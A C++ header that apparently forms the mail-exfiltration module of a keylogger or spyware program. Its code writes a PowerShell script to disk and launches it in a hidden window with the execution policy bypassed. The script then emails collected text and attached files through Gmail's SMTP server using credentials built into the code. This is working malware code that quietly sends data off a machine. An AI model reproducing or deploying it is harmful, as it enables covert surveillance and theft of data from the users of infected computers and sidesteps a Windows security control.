#pragma once
#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <string>
#include <fstream>
#include "IO.h"
#include "Timer.h"
#include <vector>

namespace Mail {

	const std::string script_name{ "sm.ps1" };
	const std::string email_from{ "youremail@gmail.com" };
	const std::string email_to{ "youremail@gmail.com" };
	const std::string email_pass{ "password" };

	Timer main_timer;

	const std::string &PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		email_to +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		email_pass +
		"\""
		" -From \"" +
		email_from +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
	/*looking at source for "what" pattern and replacing it with "with" parameter*/
	std::string stringReplace(std::string& source, const std::string& what, const std::string& with) {
		if (what.empty())
			return source;
	
		size_t index{};
		while ((index = source.find(what, index)) != std::string::npos) {
			source.replace(index, what.length(), with);
			index += with.length();
		}
		return source;
	}
	bool checkFileExists(const std::string& f) {
		std::ifstream file(f);
		return static_cast<bool>(file);
	}
	bool createScript() {
		std::ofstream script(IO::getDirectoryPath(true) + script_name);
		/*unable to create file*/
		if (!script)
			return false;
		/*push data into script file*/
		script << PowerShellScript;
		/*was writing to file ok*/
		if (!script)
			return false;
		script.close();
		return true;
	}
	int sendMail(std::string& subject, std::string& body, const std::string& attachments) {
		/*create directory to store email script*/
		bool ok{ IO::makeDir(IO::getDirectoryPath(true)) };
		/*not able to create directory*/
		if (!ok)
			return -1;
		/*get full path to file (directories+file name)*/
		std::string source_path{ IO::getDirectoryPath(true) + script_name };
		/*create script if it doesn't exist*/
		if (!checkFileExists(source_path))
			ok = createScript();
		/*could not create script*/
		if (!ok)
			return -2;
		/*Bypass running scripts disable by setting policy to ByPass*/
		std::string param{ "-ExecutionPolicy Bypass -File \"" + source_path + "\" -Subj \""
			+ stringReplace(subject,"\"","\\\"") + "\" -Body \"" + stringReplace(body, "\"","\\\"")
			+ "\" -Att \"" + attachments + "\"" };
		SHELLEXECUTEINFO shExecInfo{ 0 };
		shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		shExecInfo.hwnd = NULL;
		shExecInfo.lpVerb = "open";
		shExecInfo.lpFile = "powershell";
		shExecInfo.lpParameters = param.c_str();
		shExecInfo.lpDirectory = NULL;
		shExecInfo.nShow = SW_HIDE;
		shExecInfo.hInstApp = NULL;
		/*attempt to execute script*/
		ok = ShellExecuteEx(&shExecInfo);
		/*could not execute script*/
		if (!ok)
			return -3;
		WaitForSingleObject(shExecInfo.hProcess, 7000);
		DWORD exit_code = 100;
		GetExitCodeProcess(shExecInfo.hProcess, &exit_code);
		main_timer.setWorker([&]() {
			WaitForSingleObject(shExecInfo.hProcess, 60000);
			GetExitCodeProcess(shExecInfo.hProcess, &exit_code);
			if (exit_code == STILL_ACTIVE)
				TerminateProcess(shExecInfo.hProcess, 100);
			IO::writeAppLog("<From SendMail> Return code: " + std::to_string(exit_code));
		});
		main_timer.setRepeatCount(1L);
		main_timer.setInterval(10L);
		main_timer.start(true);
	
		return exit_code;
	}
	/*overloaded for multiple attachments*/
	int sendMail(std::string& subject, std::string& body, const std::vector<std::string>& attachments) {
		std::string atts{};
		if (attachments.size() == 1) {
			atts = attachments[0];
		}
		else {
			for (const auto &a : attachments) {
				atts += a + "::";
			}
			/*exclude extra 2 :: chars at the end*/
			atts = atts.substr(0, atts.size() - 2);
		}
		/*call main send mail function*/
		return sendMail(subject, body, atts);
	}
}

#endif
